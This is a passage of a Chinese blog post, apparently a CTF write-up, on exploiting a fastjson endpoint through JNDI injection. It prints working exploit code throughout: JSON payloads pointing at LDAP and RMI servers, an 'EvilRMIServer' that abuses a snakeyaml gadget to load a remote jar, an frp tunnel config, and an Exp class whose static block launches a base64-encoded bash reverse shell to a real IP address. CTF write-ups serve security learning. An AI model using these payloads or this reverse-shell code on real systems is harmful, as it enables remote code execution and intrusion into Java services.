+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@PostMapping</span>({<span style="color:#5af78e">&#34;/post&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">postApiTest</span>(HttpServletRequest request) {
+</span></span><span style="display:flex;"><span>        ServletInputStream inputStream <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span>        String jsonStr <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span>            inputStream <span style="color:#ff6ac1">=</span> request.<span style="color:#57c7ff">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            StringBuffer stringBuffer <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> StringBuffer();
+</span></span><span style="display:flex;"><span>            <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[]</span> buf <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> <span style="color:#9aedfe">byte</span><span style="color:#ff6ac1">[</span>1024<span style="color:#ff6ac1">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#9aedfe">int</span> len <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#9aedfe">int</span> len;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">while</span>((len <span style="color:#ff6ac1">=</span> inputStream.<span style="color:#57c7ff">read</span>(buf)) <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">-</span>1) {
+</span></span><span style="display:flex;"><span>                stringBuffer.<span style="color:#57c7ff">append</span>(<span style="color:#ff6ac1">new</span> String(buf, 0, len));
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            inputStream.<span style="color:#57c7ff">close</span>();
+</span></span><span style="display:flex;"><span>            jsonStr <span style="color:#ff6ac1">=</span> stringBuffer.<span style="color:#57c7ff">toString</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> ((Message)JSON.<span style="color:#57c7ff">parseObject</span>(jsonStr, Message.<span style="color:#57c7ff">class</span>)).<span style="color:#57c7ff">toString</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff6ac1">catch</span> (IOException var7) {
+</span></span><span style="display:flex;"><span>            var7.<span style="color:#57c7ff">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;Test fail&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在<code>/ApiTest/post</code>中有<code>((Message)JSON.parseObject(jsonStr, Message.class)).toString();</code>，利用fastjson来打，Test类给了ldap的payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">package</span> ycb.simple_json;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.fastjson.JSON;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> ycb.simple_json.message.Message;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">Test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#57c7ff">Test</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">main</span>(String<span style="color:#ff6ac1">[]</span> args) {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(JSON.<span style="color:#57c7ff">parseObject</span>(<span style="color:#5af78e">&#34;{\&#34;content\&#34; : {\&#34;@type\&#34;: \&#34;ycb.simple_json.service.JNDIService\&#34;, \&#34;target\&#34;:\&#34;ldap://101.33.211.155:8087/aaa\&#34;}, \&#34;msg\&#34;:{\&#34;$ref\&#34;:\&#34;$.content.context\&#34;}}&#34;</span>, Message.<span style="color:#57c7ff">class</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>本地尝试低版本可以打，远程不行，猜测是JNDI高版本绕过</p>
+<p>这里依赖中发现了snakeyaml，我们可以尝试rmi打反序列化</p>
+<p>贴两篇参考文章：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://tttang.com/archive/1405/#toc_snakeyaml
+</span></span><span style="display:flex;"><span>https://github.com/passer-W/snakeyaml-memshell
+</span></span><span style="display:flex;"><span>https://xz.aliyun.com/t/11208
+</span></span></code></pre></div><p>先构造一个rmi服务器</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.apache.naming.ResourceRef;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.naming.StringRefAddr;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.rmi.registry.Registry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">EvilRMIServer</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">main</span>(String<span style="color:#ff6ac1">[]</span> args) <span style="color:#ff5c57">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(<span style="color:#5af78e">&#34;[*]Evil RMI Server is Listening on port: 9999&#34;</span>);
+</span></span><span style="display:flex;"><span>        Registry registry <span style="color:#ff6ac1">=</span> LocateRegistry.<span style="color:#57c7ff">createRegistry</span>( 9999);
+</span></span><span style="display:flex;"><span>        ResourceRef ref <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ResourceRef(<span style="color:#5af78e">&#34;org.yaml.snakeyaml.Yaml&#34;</span>, <span style="color:#ff6ac1">null</span>, <span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#5af78e">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">true</span>, <span style="color:#5af78e">&#34;org.apache.naming.factory.BeanFactory&#34;</span>, <span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>        String yaml <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;!!javax.script.ScriptEngineManager [\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;  !!java.net.URLClassLoader [[\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;    !!java.net.URL [\&#34;http://1.117.171.248:8887/yaml-payload.jar\&#34;]\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;  ]]\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;]&#34;</span>;
+</span></span><span style="display:flex;"><span>        ref.<span style="color:#57c7ff">add</span>(<span style="color:#ff6ac1">new</span> StringRefAddr(<span style="color:#5af78e">&#34;forceString&#34;</span>, <span style="color:#5af78e">&#34;a=load&#34;</span>));
+</span></span><span style="display:flex;"><span>        ref.<span style="color:#57c7ff">add</span>(<span style="color:#ff6ac1">new</span> StringRefAddr(<span style="color:#5af78e">&#34;a&#34;</span>, yaml));
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(<span style="color:#5af78e">&#34;[*]Evil command: rce&#34;</span>);
+</span></span><span style="display:flex;"><span>        ReferenceWrapper referenceWrapper <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> com.<span style="color:#57c7ff">sun</span>.<span style="color:#57c7ff">jndi</span>.<span style="color:#57c7ff">rmi</span>.<span style="color:#57c7ff">registry</span>.<span style="color:#57c7ff">ReferenceWrapper</span>(ref);
+</span></span><span style="display:flex;"><span>        registry.<span style="color:#57c7ff">bind</span>(<span style="color:#5af78e">&#34;rce&#34;</span>, referenceWrapper);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>接下来将恶意jar放在对应端口后本地起一个rmiserver并利用frp将其映射到外网，client配置文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[common]
+</span></span><span style="display:flex;"><span>server_addr = 47.109.17.144
+</span></span><span style="display:flex;"><span>server_port = 8081
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[ssh]                       
+</span></span><span style="display:flex;"><span>type = tcp                  
+</span></span><span style="display:flex;"><span>local_ip = 127.0.0.1       
+</span></span><span style="display:flex;"><span>local_port = 9999        
+</span></span><span style="display:flex;"><span>remote_port = 8082 
+</span></span></code></pre></div><p>接下来kali起一个题目环境app.jar</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://192.168.111.5:8080/ApiTest/post
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST：
+</span></span><span style="display:flex;"><span># 记得type改为json
+</span></span><span style="display:flex;"><span>{&#34;content&#34; : {&#34;@type&#34;: &#34;ycb.simple_json.service.JNDIService&#34;, &#34;target&#34;:&#34;rmi://47.109.17.144:8082/rce&#34;}, &#34;msg&#34;:{&#34;$ref&#34;:&#34;$.content.context&#34;}}
+</span></span></code></pre></div><p>打完之后报500</p>
+<p><img alt="image-20220904102553126" src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220904102553126.png"></p>
+<p>接下来<code>?passer=whoami</code>即可执行命令</p>
+<p>这里发现一个问题就是远程无法连接，看了wp发现用到一个工具</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/orangetw/JNDI-Injection-Bypass
+</span></span></code></pre></div><p>将snakeyaml添加后打包</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> ReferenceWrapper <span style="color:#57c7ff">execBySnake</span>() <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        ResourceRef ref <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> ResourceRef(<span style="color:#5af78e">&#34;org.yaml.snakeyaml.Yaml&#34;</span>, <span style="color:#ff6ac1">null</span>, <span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#5af78e">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">true</span>, <span style="color:#5af78e">&#34;org.apache.naming.factory.BeanFactory&#34;</span>, <span style="color:#ff6ac1">null</span>);
+</span></span><span style="display:flex;"><span>        String yaml <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;!!javax.script.ScriptEngineManager [\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;  !!java.net.URLClassLoader [[\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;    !!java.net.URL [\&#34;http://1.117.171.248:8887/yaml-payload.jar\&#34;]\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;  ]]\n&#34;</span> <span style="color:#ff6ac1">+</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#5af78e">&#34;]&#34;</span>;
+</span></span><span style="display:flex;"><span>        ref.<span style="color:#57c7ff">add</span>(<span style="color:#ff6ac1">new</span> StringRefAddr(<span style="color:#5af78e">&#34;forceString&#34;</span>, <span style="color:#5af78e">&#34;a=load&#34;</span>));
+</span></span><span style="display:flex;"><span>        ref.<span style="color:#57c7ff">add</span>(<span style="color:#ff6ac1">new</span> StringRefAddr(<span style="color:#5af78e">&#34;a&#34;</span>, yaml));
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">new</span> ReferenceWrapper(ref);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">     *   TODO: Need more methods to bypass in different java app builded by JDK 1.8.0_191+
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">     */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#ff5c57">static</span> <span style="color:#9aedfe">void</span> <span style="color:#57c7ff">main</span>(String<span style="color:#ff6ac1">[]</span> args) <span style="color:#ff5c57">throws</span> Exception{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(<span style="color:#5af78e">&#34;Creating evil RMI registry on port 1097&#34;</span>);
+</span></span><span style="display:flex;"><span>        Registry registry <span style="color:#ff6ac1">=</span> LocateRegistry.<span style="color:#57c7ff">createRegistry</span>(1097);
+</span></span><span style="display:flex;"><span>        String ip <span style="color:#ff6ac1">=</span> args<span style="color:#ff6ac1">[</span>0<span style="color:#ff6ac1">]</span>;
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">out</span>.<span style="color:#57c7ff">println</span>(ip);
+</span></span><span style="display:flex;"><span>        EvilRMIServer evilRMIServer <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">new</span> EvilRMIServer(<span style="color:#ff6ac1">new</span> Listener(ip,5555));
+</span></span><span style="display:flex;"><span>        System.<span style="color:#57c7ff">setProperty</span>(<span style="color:#5af78e">&#34;java.rmi.server.hostname&#34;</span>,ip);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        registry.<span style="color:#57c7ff">bind</span>(<span style="color:#5af78e">&#34;ExecByEL&#34;</span>,evilRMIServer.<span style="color:#57c7ff">execByEL</span>());
+</span></span><span style="display:flex;"><span>        registry.<span style="color:#57c7ff">bind</span>(<span style="color:#5af78e">&#34;ExecByGroovy&#34;</span>,evilRMIServer.<span style="color:#57c7ff">execByGroovy</span>());
+</span></span><span style="display:flex;"><span>        registry.<span style="color:#57c7ff">bind</span>(<span style="color:#5af78e">&#34;ExecBySnake&#34;</span>,evilRMIServer.<span style="color:#57c7ff">execBySnake</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>服务器开启rmiserver</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>java <span style="color:#ff6ac1">-</span>cp JNDI<span style="color:#ff6ac1">-</span>Injection<span style="color:#ff6ac1">-</span>Bypass<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1.0</span><span style="color:#ff6ac1">-</span>SNAPSHOT<span style="color:#ff6ac1">-</span>all<span style="color:#ff6ac1">.</span>jar payloads<span style="color:#ff6ac1">.</span>EvilRMIServer <span style="color:#ff9f43">1.117</span><span style="color:#ff6ac1">.</span><span style="color:#ff9f43">171.248</span>
+</span></span></code></pre></div><p>最终payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{&#34;content&#34; : {&#34;@type&#34;: &#34;ycb.simple_json.service.JNDIService&#34;, &#34;target&#34;:&#34;rmi://1.117.171.248:1097/ExecBySnake&#34;}, &#34;msg&#34;:{&#34;$ref&#34;:&#34;$.content.context&#34;}}
+</span></span></code></pre></div><h4 id="注意">注意</h4>
+<p>关于恶意jar的构造</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/passer-W/snakeyaml-memshell
+</span></span></code></pre></div><p>或者自己构造</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.script.ScriptEngine;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.script.ScriptEngineFactory;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.util.List;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">Exp</span> <span style="color:#ff5c57">implements</span> ScriptEngineFactory {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">static</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">try</span> {
+</span></span><span style="display:flex;"><span> Runtime.<span style="color:#57c7ff">getRuntime</span>().<span style="color:#57c7ff">exec</span>(<span style="color:#5af78e">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy4xNzEuMjQ4LzM5NTQzIDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span>);
+</span></span><span style="display:flex;"><span> } <span style="color:#ff6ac1">catch</span> (IOException e){
+</span></span><span style="display:flex;"><span>            e.<span style="color:#57c7ff">printStackTrace</span>();
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getEngineName</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getEngineVersion</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> List<span style="color:#ff6ac1">&lt;</span>String<span style="color:#ff6ac1">&gt;</span> <span style="color:#57c7ff">getExtensions</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> List<span style="color:#ff6ac1">&lt;</span>String<span style="color:#ff6ac1">&gt;</span> <span style="color:#57c7ff">getMimeTypes</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> List<span style="color:#ff6ac1">&lt;</span>String<span style="color:#ff6ac1">&gt;</span> <span style="color:#57c7ff">getNames</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getLanguageName</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getLanguageVersion</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> Object <span style="color:#57c7ff">getParameter</span>(String key) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getMethodCallSyntax</span>(String obj, String m, String... args) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getOutputStatement</span>(String toDisplay) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getProgram</span>(String... statements) {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff9f43">@Override</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff5c57">public</span> ScriptEngine <span style="color:#57c7ff">getScriptEngine</span>() {
+</span></span><span style="display:flex;"><span> <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">null</span>;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>同目录下创建<code>META-INF/services/javax.script.ScriptEngineFactory</code>文件，内容为Exp</p>
+<p>编译打包即可</p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+        <div class="site-footer">
+  
+  
+
+  
+    <script src="/js/clipboard.js"></script>
+  
+
+  
+  
+
+    
+      
+      
+      <div class="site-footer">
+        <div class="busuanzi-footer">
+          <span id="busuanzi_container_site_pv">
+            本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+          </span>
+          <span class="separator">|</span> 
+          <span id="busuanzi_container_site_uv">
+            本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+          </span>
+        </div>
+        <p class="footer-beian"> 
+          <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener noreferrer">
+            蜀ICP备2021024344号-1
+          </a>
+        </p>
+      </div>
+
+      
+    </div>
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
